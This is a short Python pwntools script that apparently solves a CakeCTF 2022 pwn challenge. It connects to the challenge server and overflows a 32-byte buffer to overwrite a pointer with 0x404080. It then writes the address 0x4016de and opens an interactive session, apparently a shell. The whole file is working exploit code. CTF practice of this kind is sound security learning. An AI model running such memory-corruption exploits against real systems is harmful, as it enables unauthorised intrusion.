#!/usr/bin/env python3

from pwn import *

#io = process('./chall')
io = remote('pwn1.2022.cakectf.com',9003)
context.log_level = 'critical'

#c = input(f"odpal gdb {io.pid}")

io.recvuntil(b'choice: ')
io.sendline(b'1')

io.recvuntil(b'c_str: ')
io.sendline(b'A'*32 + p64(0x404080))

io.recvuntil(b'choice: ')
io.sendline(b'3')

io.recvuntil(b'str: ')
io.sendline(p64(0x4016de))
io.interactive()
